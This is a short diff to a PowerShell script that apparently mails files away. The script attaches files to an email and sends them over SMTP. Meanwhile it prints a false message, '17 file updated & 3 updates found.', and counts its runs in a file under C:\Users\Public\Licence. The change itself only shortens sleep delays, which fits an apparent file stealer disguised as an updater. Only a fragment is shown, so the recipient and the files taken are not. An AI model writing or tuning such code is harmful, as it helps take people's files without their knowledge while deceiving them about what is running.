@@ -110,8 +110,9 @@ else{
        Start-Sleep -Milliseconds 10
        $msg.Attachments.Add($file1)
      }
-    Start-Sleep -Milliseconds 1000
+    Start-Sleep -Milliseconds 100
     echo "This process will take some time. Please wait.."
+    Start-Sleep -Milliseconds 100
     $smtp.Send($msg) | Out-Null
     Start-Sleep -Milliseconds 500
     echo '17 file updated & 3 updates found.' 
@@ -119,9 +120,5 @@ else{
     }   
     $count= [int]$count+1
     $count > "C:\Users\Public\Licence\count.txt"
-    Start-Sleep -Milliseconds 500
-   
-    
-
-    
-exit
+    Start-Sleep -Milliseconds 10
+    exit
